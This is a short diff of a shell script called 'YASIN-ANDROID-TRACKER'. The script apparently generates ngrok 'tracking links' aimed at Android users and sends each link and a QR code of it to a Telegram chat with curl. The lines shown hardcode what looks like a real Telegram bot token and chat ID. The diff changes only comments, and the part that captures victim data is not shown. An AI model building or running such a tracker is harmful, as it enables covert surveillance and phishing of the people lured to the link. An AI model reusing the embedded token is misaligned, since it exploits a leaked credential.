@@ -2,7 +2,6 @@
 
 # YASIN-ANDROID-TRACKER
 # Created by Md Yasin Arafat
-# Telegram Tracking Bot Integration
 
 BOT_TOKEN="8128619794:AAGhkVx-64tgJeoSXB_VDSQk7LnZaOECJcI"
 CHAT_ID="5548654620"
@@ -45,7 +44,7 @@ echo -e "${GREEN}[+] Ngrok URL generated:${NC} $NGROK_URL"
 # Send link to Telegram
 curl -s "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=Your tracking link: $NGROK_URL"
 
-# Generate QR via API & Send to Telegram
+# Generate QR via online API and send to Telegram
 QR_URL="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=$NGROK_URL"
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
 -F chat_id="$CHAT_ID" \
